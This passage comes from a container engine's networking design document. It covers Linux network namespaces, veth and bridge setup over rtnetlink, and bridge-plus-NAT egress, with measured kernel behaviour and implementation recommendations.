`createContainer` and `startContainer` hooks run *inside* the container's namespaces.
Source: `runtime-spec@v1.3.0/config.md §POSIX-platform hooks`.

**Fact.** CNI — the de-facto standard that fills the gap — codifies the same split: *"The container
runtime must create a new network namespace for the container before invoking any plugins."*
Plugins configure a namespace; they never create one.
Source: `cni/SPEC.md@v1.1.0`.

Read those three together and the consequence for this document is blunt: **beyond "you get a
network namespace", there is no specification to conform to.** Every address, every bridge, every
NAT rule, every resolver below is either a convention some other engine happens to follow or a
decision of ours. A reader who arrives expecting a standard will spend a week looking for one. There
isn't one.

---

### 11.1 The network namespace: creation, persistence, entry, destruction

#### What a fresh namespace actually contains

**Fact.** A newly created network namespace contains exactly one device — `lo` — and that device is
`DOWN`, with `qdisc noop`, and **has no `127.0.0.1` address**. The address is installed by the
kernel's `inetdev_event` → `inetdev_init` path in response to the `NETDEV_UP` notification for a
loopback device, not at namespace creation.
Measured: Rocky 8.8, kernel `4.18.0-425.3.1.el8`, unprivileged uid inside `unshare -Urn`:
`ip -o link show` lists only `1: lo: <LOOPBACK> ... state DOWN`; `ip -o addr show` is empty; `ip
route show` is empty with exit 0. After `ip link set lo up`, `127.0.0.1/8 scope host` and `::1/128`
appear.
Source for the mechanism: `v6.11/net/ipv4/devinet.c`.

**Recommendation.** Bring `lo` up (`RTM_NEWLINK`, `ifi_flags = IFF_UP`, `ifi_change = IFF_UP`) in
every container network namespace we create, including `--network=none`. An enormous amount of
software binds a local listener for IPC — Python `multiprocessing`, JVM internals, anything with a
supervisor-to-worker socket — and fails in ways that look nothing like a networking fault when
`127.0.0.1` does not exist. This is one message and it is the highest value-per-byte line in the
whole domain.

**Fact.** The entirety of `/proc/sys/net` is per-network-namespace. Writing
`/proc/sys/net/ipv4/ip_forward` inside an unprivileged `unshare -Urn` succeeds and leaves the host
value unchanged (measured: kernel 4.18, unprivileged userns). This is why per-container network
sysctls are safe and why a container engine can offer them.

**Fact.** A fresh namespace does **not** reliably start with `ip_forward = 0`. Measured on kernel
4.18 it was `1`, inherited from the initial namespace's mutated `ipv4_devconf` template. Read the
value; never assume it.

**Trap.** `net.ipv4.ip_forward` is a destructive write. `Documentation/networking/ip-sysctl.rst` on
`ip_forward`: *"This variable is special, its change resets all configuration parameters to their
default state (RFC1122 for hosts, RFC1812 for routers)."* Writing it after configuring `rp_filter`,
`accept_local`, `route_localnet` or `arp_ignore` silently discards those. If it must be written at
all, it goes first, and only after reading that it is not already 1. §11.5 argues we should never
write it.

**Trap.** `net.ipv4.ping_group_range` in a fresh namespace reads `65534 65534`, which looks like a
configured one-group range and **is not**. `inet_init_net()` sets it to `make_kgid(&init_user_ns,1)`
/ `make_kgid(&init_user_ns,0)` — the upstream *empty* range `1 0`, meaning nobody. Read from inside
a user namespace where init-gids 0 and 1 are unmapped, both bounds render as `overflowgid` = 65534.
An implementation that parses the current value and concludes "a range is already configured" is
silently wrong. Never read it to decide whether to write.
Measured: kernel 4.18, `unshare -Urn` with `gid_map: 0 709200513 1`.

#### `nsfs`, and how a namespace stays alive with nothing in it

**Fact.** Namespaces are exposed through a dedicated filesystem, `nsfs`. `/proc/<pid>/ns/net` is a
magic symlink whose readlink text is `net:[<inode>]`; opening it yields a file descriptor referring
to that nsfs inode. Two processes share a network namespace if and only if those inodes match.
Source: `namespaces(7)`.

**Fact.** A namespace lives as long as *anything* references it, and there are three kinds of
reference: a process's `nsproxy`, an open file descriptor, or **a bind mount of the nsfs file**. The
bind mount is what lets a network namespace outlive every process that was ever in it.

**Trap.** `network_namespaces(7)` says *"When a network namespace is freed (i.e., when the last
process in the namespace terminates)"*. That parenthetical is an imprecise simplification and it is
exactly the belief that makes people think a namespace leak is impossible. Demonstrated otherwise:
`ip netns add p1` then `ip netns exec p1 ip -o link show` lists `lo` in a namespace **no process
ever entered**, held alive solely by the bind mount; removing the mount drops the nsfs count in
`/proc/self/mountinfo` to zero. Cite `namespaces(7)` plus this demonstration, not
`network_namespaces(7)`.
Measured: kernel 4.18, inside `unshare -Urmn` with a private tmpfs on `/run`.

**Fact.** The bind mount is an ordinary bind mount — nothing kernel-special about the path:

```
$ grep nsfs /proc/self/mountinfo
3044 3043 0:4 net:[4026534758] /run/netns/p1 rw shared:1385 - nsfs nsfs rw
$ stat -c '%i %F %s %A' /run/netns/p1
4026534758 regular empty file 0 -r--r--r--
```

Two details worth keeping: the mounted file's **inode number is the namespace id** (`4026534758`
appears both as `st_ino` and inside `net:[…]`), so `fstat().st_ino` on a namespace fd is the
namespace's identity with no string parsing; and the file presents to userspace as a zero-byte
read-only regular file. The `shared:1385` is `ip netns`'s self-bind plus `mount --make-shared`,
which exists so the mounts propagate into other mount namespaces.
Measured: kernel 4.18, `unshare -Urmn`.

**Convention.** `/var/run/netns/<name>` is a userspace convention of `iproute2` and nothing more.
`ip-netns(8)` says so outright: *"By convention a named network namespace is an object at
/var/run/netns/NAME that can be opened."* `ip netns list` is `readdir("/var/run/netns")` and nothing
else. Docker does not use that directory; it bind-mounts into `/run/docker/netns/`. Measured on a
live Ubuntu 24.10 host running Docker 28.3.1 with five running containers: `ip netns list` printed
nothing while `lsns -t net` showed five namespaces bind-mounted under `/run/docker/netns/`. This is
also why `ip netns exec` advice from the internet never works on Docker containers.

**Recommendation.** Use our own directory — `/run/mydocker/netns/<container-id>` — and perform the
bind mount ourselves. Three reasons: a passing admin's `ip netns delete` cannot destroy our state;
the directory is self-describing, which §11.7's reconcile pass depends on; and it costs three
syscalls. The cost is that `ip netns exec <name>` will not work for debugging — mitigate by shipping
our own `exec` and printing the nsfs path in `inspect`.

**Recommendation.** For rootless, the state directory must be one the *real* user owns —
`$XDG_RUNTIME_DIR/mydocker/`, never `/run/mydocker/`. Being uid 0 in a user namespace does **not**
grant DAC override over files owned by uids outside that namespace's map: `mkdir /var/run/netns`
inside `unshare -Urmn` fails with `EACCES` because `/run` is owned by real `root:root` while our
uid 0 maps to an unprivileged host uid. Capabilities are namespaced; file ownership is not.
Measured: kernel 4.18, `uid_map: 0 900000000 1`.

#### Creating and pinning

**Fact.** Two ways to obtain a namespace: `unshare(CLONE_NEWNET)` moves the **calling thread** into
a new one; `clone(…, CLONE_NEWNET, …)` starts the **child** in a new one. Both require
`CAP_SYS_ADMIN` in the caller's current user namespace.
Source: `unshare(2)`, `clone(2)`.

**Trap.** `unshare(CLONE_NEWNET)` affects only the calling thread. Calling it on a thread of a
multi-threaded daemon leaves one thread silently in a different namespace from its siblings, and the
resulting bug — a socket created in the wrong namespace — is invisible until something fails to
receive traffic.

**Recommendation.** Let container creation make the namespace (the OCI `namespaces` array already
expresses it), then pin it by bind-mounting `/proc/<container-pid>/ns/net` onto our placeholder
file. This avoids unsharing in the daemon at all. The cost is that the namespace exists only after
the container process does, so the container must block before `execve`ing its entrypoint until
network setup completes — a synchronisation point the runtime needs for other reasons anyway.

#### Entering a namespace: `setns(2)` and the check that produces the wrong error

**Fact.** `setns(fd, CLONE_NEWNET)` moves the **calling thread** into the namespace `fd` refers to.
There is no whole-process form. In a multi-threaded Rust program this means a dedicated OS thread
plus a restore on the way out, including on panic.
Source: `setns(2)`.

**Fact.** Joining a network namespace requires `CAP_SYS_ADMIN` in **two** user namespaces, not one.
`v6.11/net/core/net_namespace.c`:

```c
static int netns_install(struct nsset *nsset, struct ns_common *ns)
{
	struct net *net = to_net_ns(ns);

	if (!ns_capable(net->user_ns, CAP_SYS_ADMIN) ||
	    !ns_capable(nsset->cred->user_ns, CAP_SYS_ADMIN))
		return -EPERM;
	...
}
```

`CAP_SYS_ADMIN` in the **target namespace's owning user namespace**, *and* `CAP_SYS_ADMIN` in the
**caller's own current user namespace**.

**Recommendation.** Always `setns(userns)` first, then `setns(netns)`. Joining the user namespace
grants a full capability set in it, which makes `nsset->cred->user_ns` the container's user
namespace where `CAP_SYS_ADMIN` is held, and both checks then pass. Getting this backwards produces
an `EPERM` that looks like a permissions bug in the wrong place. (`slirp4netns` ≥ 1.0 does exactly
this in its `nsenter()`, opening `/proc/<pid>/ns/user` itself when `--userns-path` is absent — which
is why it works from a plain unprivileged login shell; see §11.8.)

#### The socket-creation trick

**Fact.** A socket's network namespace is fixed at `socket(2)` time from the creating thread's
namespace, and does not follow the process afterwards. So a thread may `setns` into a container
namespace, `socket()` + `bind()`, `setns` back, and the process continues serving that socket from
outside the namespace.

**Convention.** This is how Docker's embedded DNS resolver works. Measured on Ubuntu 24.10 / Docker
28.3.1: `dockerd` (pid 70234, host network namespace) owns fds 57 and 60, which appear as
`127.0.0.11:43967` (UDP) and `127.0.0.11:42041` (TCP) **in the container's namespace socket table**.

**Recommendation.** Use this pattern for our resolver and for anything else needing a listener
inside a container namespace. It beats a helper process living permanently in the namespace: no
extra process to supervise or leak, the socket dies with the namespace automatically, and our event
loop handles it like any other fd. It forces one architectural primitive on the runtime: **"run this
closure on a dedicated OS thread pinned into namespace X, then restore."**

#### Destruction, and why veth cleanup code should not be written

**Fact.** `network_namespaces(7)`, verbatim and asymmetric: *"When a network namespace is freed …
its physical network devices are moved back to the initial network namespace"* and *"When a
namespace is freed, the `veth(4)` devices that it contains are destroyed."* So **physical** devices
you moved in migrate back to the **initial** namespace (not the parent's) and survive; **virtual**
devices are destroyed.

**Fact.** A veth pair is one object with two ends; deleting either end deletes both.
Source: `veth(4)`.

**Fact.** Composing the two: when a container's namespace dies, the **host-side** veth disappears
too, with no action from us. Measured twice independently on kernel 4.18 — a `hostend`/`childend`
pair with the child end moved into a separate namespace; on killing that namespace's process,
`hostend` vanished from the parent namespace within three seconds, leaving only `lo`.

**Recommendation.** Write no cleanup code for either veth end. Every line of veth teardown is a line
that can fail and leave a worse state than doing nothing. Correspondingly, **the teardown operation
that actually matters is `umount2(nsfs_path, MNT_DETACH)` + `unlink(path)`** — that is not
filesystem hygiene, it is the act that destroys the namespace and therefore garbage-collects the
interfaces. Everything after it is best-effort.

**Fact.** A veth end is displayed as `hostv@if2` — the peer is identified by **ifindex in the other
namespace**, and the peer's name is not preserved across the reference. `link-netnsid` values are
per-namespace-local ids independently assigned on each side; `0` from the host means the container
and `0` from the container means the host. They are not global identifiers.

**Fact.** The peer cannot be read back at all. `netlink-packet-route`'s own source records that
`struct rtnl_link_ops veth_link_ops` has no `fill_info`, so `IFLA_LINKINFO`/`IFLA_INFO_DATA` is
create-only for veth; the only discoverable relation is `IFLA_LINK`, an ifindex.
**Recommendation.** Our reconcile sweep must match host veths on a **name prefix**, never on peer
information.

**Trap.** A stale bind-mount placeholder — the state left by dying between
`open(O_CREAT|O_EXCL)` and `mount --bind` — is indistinguishable from a live namespace by
`readdir`, and it **wedges the retry**: a second create with the same deterministic name fails
`EEXIST`. The positive identification is `setns()` returning **`EINVAL`** on a path we created,
because the fd refers to a tmpfs regular file rather than an nsfs inode. Reproduced verbatim on two
separate passes, kernel 4.18:

```
ip netns list            -> "Error: Peer netns reference is invalid." (x2), then lists both
ip netns add crashed     -> rc=1   Cannot create namespace file ".../crashed": File exists
ip netns exec crashed    -> rc=255 setting the network namespace "crashed" failed: Invalid argument
ip netns delete crashed  -> rc=0   (recovers: umount fails harmlessly, unlink succeeds)
```

**Recommendation.** Teardown is `umount2` **then** `unlink`, and `unlink` must run even when
`umount2` failed. `EINVAL`/`ENOENT` from `umount2` is the *expected* result on a placeholder;
treating it as fatal converts a recoverable leak into a permanent one.

---

### 11.2 veth, bridges, addresses and routes over rtnetlink

We speak `NETLINK_ROUTE` directly rather than exec `ip`. What that costs is three message types,
three payload structs and about fourteen attributes.

#### Socket and framing

**Fact.** `socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_ROUTE)`, then `bind()` a
`struct sockaddr_nl { .nl_family = AF_NETLINK, .nl_pid = 0, .nl_groups = 0 }`. `nl_pid = 0` on bind
asks the kernel to auto-assign a unique port id — do **not** hardcode `getpid()`, which breaks with
threads and with two sockets in one process. Destination `nl_pid = 0` means "the kernel".
Source: `netlink(7)`.

**Fact.** The encoding rule, stated exactly, because this is where hand-rolled codecs break first.
From `iproute2/lib/libnetlink.c::addattr_l`:

```c
rta->rta_len  = RTA_LENGTH(alen);          /* 4 + alen — UNALIGNED */
nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
```

`rta_len` holds the **unaligned** length, the write cursor advances by the **aligned** length, and
the trailing pad bytes **are counted** in `nlmsg_len`. Only positions are aligned, never the length
fields. Nesting works identically: emit a header with `rta_len = RTA_LENGTH(0)`, remember the
offset, append 4-aligned children, back-patch `nest->rta_len = cursor - nest_offset`.
`struct nlattr` is byte-identical to `struct rtattr`. `iproute2` does not set `NLA_F_NESTED (1<<15)`
on container attributes and the kernel masks it off, so omitting it matches the reference.
`nlmsghdr` is 16 bytes, `ifinfomsg` 16, `ifaddrmsg` 8, `rtmsg` 12 — all naturally 4-aligned, so no
padding is needed between the family header and the first attribute.

**Fact.** The ack is an error message with errno 0: the kernel replies `NLMSG_ERROR` carrying
`struct nlmsgerr { int error; struct nlmsghdr msg; }`, where `error == 0` means success and
`error < 0` is `-errno`.

**Recommendation.** Enable `NETLINK_EXT_ACK` on day one:
`setsockopt(fd, SOL_NETLINK /*270*/, NETLINK_EXT_ACK /*11*/, &one, 4)`. The kernel then sets
`NLM_F_ACK_TLVS (0x200)` on the reply and appends `NLMSGERR_ATTR_MSG` (a human-readable string),
`NLMSGERR_ATTR_OFFS` (byte offset of the offending attribute) and `NLMSGERR_ATTR_MISS_TYPE`. Without
it a malformed message returns a bare `EINVAL`. It is one `setsockopt` and it is the difference
between a week of debugging and an afternoon.

**Trap.** Do not make control flow depend on the ext-ack *text*. On kernel 4.18 neither of the two
most quoted strings appeared at all: moving `lo` between namespaces returned bare **`EINVAL`** (not
`EPERM`, and no message), and a name collision returned bare **`EEXIST`**. Branch on the errno; log
the text when it exists.

**Recommendation.** Also set `NETLINK_GET_STRICT_CHK (12)`. Without it the kernel ignores the filter
fields on dump requests and returns the entire table, so an `RTM_GETLINK` filtered by ifindex
silently gives you everything. This is a known production footgun — netavark sets it with the
comment *"Needs to be enabled for dump filtering to work"*.

**Recommendation.** Use `NLM_F_ECHO` on creates. The kernel echoes the resulting object back, so the
new ifindex arrives with the ack instead of needing a follow-up `RTM_GETLINK` — one fewer round trip
and one closed TOCTOU window.

#### The veth message, and the shortcut that removes a whole step

**Fact.** `ip link add veth0 type veth peer name veth1` is a single `RTM_NEWLINK` with
`NLM_F_REQUEST|NLM_F_CREATE|NLM_F_EXCL|NLM_F_ACK`, an all-zero `struct ifinfomsg`, and:

```
IFLA_IFNAME  = "veth0"
IFLA_LINKINFO (18, nested)
  ├─ IFLA_INFO_KIND (1) = "veth"
  └─ IFLA_INFO_DATA (2, nested)
       └─ VETH_INFO_PEER (1, nested)
            ├─ struct ifinfomsg        <-- A SECOND, ZEROED ifinfomsg, INLINE
            └─ IFLA_IFNAME = "veth1"   <-- then a normal attribute list
```

**Trap.** `VETH_INFO_PEER`'s payload is **not** a plain attribute list. It begins with a bare
`struct ifinfomsg` and only then does the attribute list start. The kernel's offset arithmetic is
explicit — `net/core/rtnetlink.c`, `rtnl_nla_parse_ifinfomsg()`:

```c
attrs = nla_data(nla_peer) + sizeof(struct ifinfomsg);
len   = nla_len(nla_peer)  - sizeof(struct ifinfomsg);
```

and `veth_policy[VETH_INFO_PEER] = { .len = sizeof(struct ifinfomsg) }`, so a payload shorter than
16 bytes returns `-ERANGE`. Writing 16 zero bytes is sufficient and correct.
Sources: `iproute2/ip/link_veth.c` (note: **not** `ip/iplink_veth.c`, which no longer exists),
`v6.11/net/core/rtnetlink.c`, `v6.11/drivers/net/veth.c`.

**Fact.** Putting `IFLA_NET_NS_FD` **inside** the `VETH_INFO_PEER` nest creates the peer directly in
the target namespace — no separate move message. `veth_link_ops.peer_type = VETH_INFO_PEER` makes
the generic rtnetlink path (`rtnl_get_peer_net()` → `rtnl_link_get_net_ifla()`) resolve the peer's
namespace *before* `veth_newlink()` runs. Attributes inside the nest (`IFLA_IFNAME`, `IFLA_MTU`,
`IFLA_ADDRESS`, `IFLA_TXQLEN`) apply to the peer only; the same attributes at top level apply to the
near end only. `IFF_UP` in the embedded `ifinfomsg` even brings the peer up at birth.

**Fact.** Verified behaviourally: `ip link add hostv type veth peer name ceth netns $C` — which is
precisely this encoding — leaves the parent namespace with `hostv@if2` and the child with
`ceth@if2`, and **`ceth` never appeared in the creating namespace at any point**.
Measured: kernel 4.18, unprivileged `unshare -Urn`.

**Recommendation.** Use the single-message form. It collapses create → look up peer ifindex → move
peer → rename peer into one message, and it eliminates both a race (another process seeing or
grabbing the container-side device) and a leak window (dying between create and move leaves a stray
veth in the host namespace). It is strictly better on correctness and strictly fewer lines; no
tradeoff was found.

**Fact.** The peer gets the **lower** ifindex. `ip link add vA type veth peer name vB` produced
`4: vB@vA` and `5: vA@vB`. Both ends start `<BROADCAST,MULTICAST,M-DOWN>`: a veth end only reports
`LOWER_UP` when its *peer* is up.
**Recommendation.** Bring up **both** ends. Forgetting the host end is the classic "the container
has an address and a route and still cannot ping its gateway" bug, and it presents as
`LOWERLAYERDOWN`/`NO-CARRIER`, not as an error from any command you ran.

#### Moving a device, and the rename asymmetry

**Fact.** `RTM_NEWLINK` with `ifinfomsg.ifi_index = <ifindex>` and exactly one of `IFLA_NET_NS_FD`
(28, a u32 fd), `IFLA_NET_NS_PID` (19) or `IFLA_TARGET_NETNSID` (46). They are mutually exclusive;
the kernel rejects combinations.

**Recommendation.** Use `IFLA_NET_NS_FD`, never `IFLA_NET_NS_PID`. A pid is a racy identifier — the
container can die and the pid be recycled between our message and the kernel's lookup, moving a veth
into a stranger's namespace. An fd is a stable reference to the namespace object; if the container
dies the namespace stays alive because we hold the fd, and the operation is still correct. Cost: one
`open()`. This is a correctness argument, not a style preference.

**Trap.** `IFLA_IFNAME` serves two different purposes in a move message and only one is
unconditional. As a **collision fallback**, `do_setlink()` passes it as `pat` to
`__dev_change_net_namespace()`, which uses it *only if* the device's current name is already taken
in the target namespace (and `pat` may contain `%d`). As an **explicit rename**, later in the same
`do_setlink()`:

```c
if (ifm->ifi_index > 0 && ifname[0]) { err = netif_change_name(dev, ifname); ... }
```

So the rename happens in the same message **only if the device is identified by `ifi_index > 0`**.
Identify it by `IFLA_IFNAME` with `ifi_index == 0` and the name is the *lookup key*, so no rename
occurs. **Recommendation:** always identify links by `ifi_index`. It makes rename-on-move work, and
names are not unique across namespaces while indexes are unambiguous within one.

#### Flags, addresses, routes, bridges

**Trap — the worst default in rtnetlink.** Link flags are set with `ifi_flags` (desired bits) and
`ifi_change` (the **mask** of bits being touched), and the zero case is inverted:

```c
/* bugwards compatibility: ifi_change == 0 is treated as ~0 */
if (ifm->ifi_change)
	flags = (flags & ifm->ifi_change) | (rtnl_dev_get_flags(dev) & ~ifm->ifi_change);
```

`ifi_change == 0` means **"replace the entire flag word"**. Sending `flags = IFF_UP, change = 0`
does not mean "set UP"; it means "set the flags to exactly `IFF_UP`", clearing `IFF_BROADCAST`,
`IFF_MULTICAST`, `IFF_NOARP` and everything else — so the link comes up and ARP quietly stops
working. In Rust a zeroed struct is the *dangerous* case, not the safe one.
**Recommendation.** Set `ifi_change` explicitly on every link message, to exactly the bits touched.
Up = `flags=IFF_UP, change=IFF_UP`. Down = `flags=0, change=IFF_UP`. Make the mask non-optional in
whatever builder we write.
Source: `v6.11/net/core/rtnetlink.c`, `rtnl_dev_combine_flags()`.

**Fact.** Addresses: `RTM_NEWADDR` with `struct ifaddrmsg` plus `IFA_LOCAL` and `IFA_ADDRESS`. For
IPv4 the kernel requires `IFA_LOCAL` and defaults `IFA_ADDRESS` to it. On a broadcast interface the
two are the same; on a point-to-point link `IFA_ADDRESS` is the *peer*. `iproute2` sends no
`IFA_BROADCAST` unless `brd` was typed, and `ifa_scope` is `RT_SCOPE_HOST(254)` only for `127.x`,
`0` otherwise. The complete wire form of `ip addr add 172.17.0.2/16 dev eth0` is five fields and two
attributes — nothing else.
Source: `v6.11/net/ipv4/devinet.c`, `iproute2/ip/ipaddress.c`.

**Fact.** Adding an address auto-creates the connected route
(`172.17.0.0/16 dev eth0 proto kernel scope link src 172.17.0.2`). We never add the on-link route
ourselves; only the default route.

**Fact.** Routes: `RTM_NEWROUTE` with `struct rtmsg`. For a default route via a gateway:
`rtm_dst_len = 0`, `rtm_table = RT_TABLE_MAIN(254)`, `rtm_protocol = RTPROT_BOOT(3)`,
`rtm_type = RTN_UNICAST(1)`, `rtm_scope = RT_SCOPE_UNIVERSE(0)`, attribute `RTA_GATEWAY`, and
**no `RTA_DST` at all** — absent, not zero-length.

**Trap.** `rtm_scope` is auto-selected by `iproute2` and getting it wrong yields `EINVAL` or
`ENETUNREACH` with no detail: **gateway present ⇒ `RT_SCOPE_UNIVERSE(0)`; no gateway ⇒
`RT_SCOPE_LINK(253)`**.
**Trap.** Ordering. `ip route add default via X` sends no `RTA_OIF`; the kernel resolves the output
device by looking the gateway up (`fib_check_nh`), which requires a scope-LINK route covering the
gateway to already exist. In our sequence that route comes free from `RTM_NEWADDR`, so the order
**must** be: address the interface, *then* add the default route. Reversed, it fails `ENETUNREACH`.
(`rtm_flags |= RTNH_F_ONLINK(4)` is the escape hatch, i.e. `ip route add … onlink`.)
Source: `iproute2/ip/iproute.c`.

**Fact.** Bridge creation is `RTM_NEWLINK` with `IFLA_LINKINFO{IFLA_INFO_KIND="bridge"}`.
Enslaving is a plain `RTM_NEWLINK` (no `NLM_F_CREATE`) with `ifi_index = <host veth>` and
`IFLA_MASTER = <bridge ifindex>` (attribute 10, u32); `IFLA_MASTER = 0` un-enslaves.

**Trap.** There is **no `IFLA_BRPORT_HAIRPIN_MODE` symbol.** Hairpin is `IFLA_BRPORT_MODE = 4`, a u8.
(`net/bridge/br_netlink.c`: `br_set_port_flag(&set, &clear, tb, IFLA_BRPORT_MODE, BR_HAIRPIN_MODE)`.)
Per-port options have two encodings: **Path A**, `RTM_NEWLINK` on the port with
`IFLA_LINKINFO{IFLA_INFO_SLAVE_KIND(4)="bridge", IFLA_INFO_SLAVE_DATA(5){IFLA_BRPORT_*}}`; and
**Path B**, `RTM_SETLINK` with `ifi_family = AF_BRIDGE` and `IFLA_PROTINFO(12)`.
**Recommendation.** Use Path A — it is an ordinary `RTM_NEWLINK` and needs no `AF_BRIDGE`
special-casing in our codec. Useful numbers: `STATE 1`, `PRIORITY 2`, `COST 3`, `MODE 4`,
`LEARNING 8`, `UNICAST_FLOOD 9`, **`ISOLATED 33`**, `LOCKED 39`.

**Fact.** **A veth does not inherit its bridge's MTU.** A 1500-MTU veth enslaved to a 1400-MTU
bridge stays at 1500, on both ends. Measured: kernel 4.18.

**Recommendation.** Default the bridge MTU to the MTU of the interface carrying the host's default
route, not to 1500, and apply it to the bridge and **both** veth ends via `IFLA_MTU`. Read it with
`RTM_GETROUTE` for the default route → `RTA_OIF` → `RTM_GETLINK` → `IFLA_MTU`. The failure this
prevents is the least-diagnosable bug in container networking: on a host whose uplink is 1450 (many
clouds), 1400 (WireGuard) or 1476 (GRE), small packets work, DNS works, `ping` works, TCP handshakes
work, and the connection hangs the instant a full-size segment is sent — because PMTUD depends on
ICMP type 3 getting back to the container, and ICMP is widely dropped. Symptoms are "curl hangs at
the same byte count every time", "`apt update` works but `apt install` hangs", "TLS handshake
completes then stalls on the certificate". About twenty lines. Expose a `--mtu` override; accept
that we will not re-tune running containers when the default route changes.

#### The complete message set

| # | Operation | Message | Key attributes |
|---|---|---|---|
| 1 | create bridge (per network) | `RTM_NEWLINK` | `IFLA_IFNAME`, `IFLA_LINKINFO{INFO_KIND="bridge"}`, `IFLA_MTU` |
| 2 | address the bridge | `RTM_NEWADDR` | `IFA_LOCAL`, `IFA_ADDRESS`, `ifa_prefixlen` |
| 3 | bridge up | `RTM_NEWLINK` | `ifi_flags=IFF_UP`, `ifi_change=IFF_UP` |
| 4 | **veth pair, peer already in the container namespace** | `RTM_NEWLINK` | `IFLA_IFNAME`, `IFLA_MTU`, `IFLA_LINKINFO{"veth", INFO_DATA{VETH_INFO_PEER{ifinfomsg(0), IFLA_IFNAME, IFLA_MTU, IFLA_NET_NS_FD}}}` |
| 5 | enslave host end | `RTM_NEWLINK` | `ifi_index`, `IFLA_MASTER` |
| 6 | host end up | `RTM_NEWLINK` | `IFF_UP` + mask |
| 7 | *(in the namespace)* `lo` up | `RTM_NEWLINK` | `IFF_UP` + mask |
| 8 | *(in the namespace)* address `eth0` | `RTM_NEWADDR` | `IFA_LOCAL`, `IFA_ADDRESS`, prefixlen |
| 9 | *(in the namespace)* `eth0` up | `RTM_NEWLINK` | `IFF_UP` + mask |
| 10 | *(in the namespace)* default route | `RTM_NEWROUTE` | `rtm_dst_len=0`, `RTA_GATEWAY`, scope UNIVERSE — **after** step 8 |

**Fact.** Three message types for the happy path, plus `RTM_GET*` dumps and `RTM_DEL*` for
reconciliation. Three payload structs. About fourteen attributes. `RTM_SETLINK` is never needed —
`iproute2` itself uses `RTM_NEWLINK` without `NLM_F_CREATE` for every `ip link set`.
Namespace creation is **not** netlink: it is `unshare`/`setns` plus a bind mount. `RTM_NEWNSID` only
*labels* an existing namespace; it does not create one.

**Fact — the architectural consequence.** A netlink socket is permanently bound to the namespace it
was **created** in. Combined with `setns` being per-thread, this means **one socket per namespace,
opened after `setns`, on a dedicated OS thread.** This is the primitive §11.1 already named and it
constrains the runtime's threading model, not just its networking code.

**Recommendation.** Do not shell out to `ip`. Four specific reasons in order of how much they hurt:
(1) `ip` reports failures as English on stderr with exit code 1/2/255, so "already exists" cannot be
distinguished from "permission denied" from "no such device" without parsing prose — and idempotent,
resumable setup (§11.7) depends entirely on that distinction; (2) `ip link set X netns <pid>` takes
a pid, which is racy, and there is no way to pass an fd through a CLI; (3) its argument grammar is
not stable across versions — on `iproute2` 6.2, `ip link set X netns /proc/<pid>/ns/net` is rejected
with `argument "..." is wrong: Invalid "netns" value` while the same path form on the *create* path
is accepted; (4) about twelve `fork`+`exec` per container start. The legitimate use of `ip` is as an
oracle while developing: `ip -d link show` to check our work, `strace -e sendmsg ip link add …` to
diff our bytes against `iproute2`'s.

---

### 11.3 The bridge model

**Fact.** A `bridge` device is an in-kernel software IEEE 802.1D learning Ethernet switch. It keeps
a forwarding database (FDB) mapping MAC → port, learned from the source addresses of received
frames and aged out after `ageing_time`. Known unicast goes to one port; unknown-unicast, broadcast
and multicast are flooded to all forwarding ports. It operates at L2 and needs no IP address to
switch.
Source: `Documentation/networking/bridge.rst`.

**Fact.** Giving the bridge an IP address turns it into **a switch plus a router interface on that
switch**. `172.18.0.1/16` on the bridge means the host has an interface on the container segment,
the kernel installs a connected route for the subnet, and that address can serve as the containers'
default gateway. Everything else follows from ordinary IP routing.

**Fact.** A bridge with zero enslaved ports has **no carrier**: it reports
`<NO-CARRIER,BROADCAST,MULTICAST,UP> state DOWN` and its connected route is marked `linkdown`. This
is normal, not a fault, and it is why an unused default bridge looks broken.
Measured: Ubuntu 24.10 / kernel 6.11.0-29, three bridges, only the one with ports `LOWER_UP`.

**Recommendation.** Leave STP off (`IFLA_BR_STP_STATE = 0`, which is the default). A container
bridge is a star with no possible loop, and STP's only effect would be a 15–30 second forwarding
delay on every container start during which the container has a link but no connectivity. Zero
benefit, large cost.

**Fact.** ARP and neighbour behaviour require nothing from us. The container ARPs for the gateway;
the request floods the bridge and the **bridge device itself answers**, because it owns that
address. For a peer container the request floods, the peer answers, and the bridge learns both MACs.
No proxy ARP, no static neighbour entries. Measured: a container's neighbour table held the
bridge's own MAC for the gateway and the real MACs of two peers.

**Fact — the entire container-side configuration is three items.** An address with a prefix, the
kernel-generated connected route, and a default route:

```
2: eth0@if162  inet 172.18.0.4/16 brd 172.18.255.255 scope global eth0
default via 172.18.0.1 dev eth0
172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.4
```

#### Why bridge + NAT, and not the alternatives

| Model | Container gets | Needs from the network | Fails when |
|---|---|---|---|
| **bridge + NAT** | private RFC 1918 address | **nothing** | inbound needs explicit DNAT; conntrack table pressure |
| routed bridge (no NAT) | private address, globally routed | the upstream router must route your subnet to your host | you do not control the router — i.e. almost always |
| macvlan / ipvlan | an address on the host's own L2 | a free LAN address per container, and a switch tolerating many MACs per port | cloud NICs (MAC filtering), Wi-Fi (802.11 has no multi-MAC), address exhaustion |
| host namespace | the host's addresses | nothing | zero isolation, port collisions |

**Recommendation.** bridge + NAT is our only routed model. The decisive property is not performance
or elegance: it is that **it requires nothing whatsoever from the network the host sits on**, so it
behaves identically on a laptop behind Wi-Fi NAT, a cloud VM, a CI runner, and inside another
container. Ship macvlan never, or much later, and only as an explicit opt-in driver.

**Fact.** One rule makes egress work, and it is load-bearing:

```
-A POSTROUTING -s 172.18.0.0/16 ! -o br-9d68a0cc943b -j MASQUERADE
```

The internet has no route to RFC 1918 space, so a container's SYN would arrive with source
`172.18.0.4` and the reply would be blackholed. MASQUERADE rewrites the source to the outgoing
interface's address and conntrack reverses it on the way back. **Without this one rule, containers
send packets and never receive replies — which presents as "DNS times out, everything times out",
not as a permission error.**
The `! -o <bridge>` exclusion is equally load-bearing: without it, container-to-container traffic on
the same bridge would also be masqueraded, so every container would see every peer as coming from
the gateway and peer source addresses would be destroyed.
Measured: Ubuntu 24.10 / Docker 28.3.1, counter `packets 51369 bytes 3378872` on that rule.

**Recommendation.** Use `MASQUERADE`, not `SNAT --to-source X`. MASQUERADE looks up the outgoing
interface's primary address per connection, so it survives a changing host address (DHCP, failover);
static SNAT breaks the moment the address changes and we have no code watching for that.

#### Forwarding, and the module we should not load

**Fact.** With `net.ipv4.ip_forward = 0`, a packet arriving on the bridge destined for a non-local
address is dropped **in the routing decision** — before `filter/FORWARD`, before any rule of ours.
